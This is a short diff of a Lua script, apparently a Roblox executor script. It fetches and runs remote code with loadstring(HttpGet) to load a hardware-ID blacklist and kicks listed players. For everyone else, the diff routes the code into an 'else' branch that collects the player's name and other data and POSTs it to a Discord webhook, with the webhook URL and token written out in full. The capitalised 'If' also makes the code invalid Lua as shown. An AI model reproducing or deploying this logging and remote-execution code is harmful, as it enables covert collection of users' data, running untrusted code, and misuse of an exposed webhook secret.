@@ -6,8 +6,7 @@ local HWIDTable = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ast
   for i,v in pairs(HWIDTable) do
      If v == HWID then
 game.Players.LocalPlayer:Kick("bye")
-    end
-end
+ else
 local Players = game:GetService("Players")
 local Name = game.Players.LocalPlayer.Name
 local LocalPlayer = Players.LocalPlayer
@@ -71,3 +70,4 @@ local Encoded = HttpService:JSONEncode(Data)
 local Request = http_request or request or HttpPost or syn.request
 local Final = {Url = "https://discord.com/api/webhooks/1329954213811191913/gKQDWRFNoJjl2wIq6Ra8VazUAIx85EnKfTEXTwHa0e4gMuou3va-9hg0J53tFP_RnkrT", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
+  end
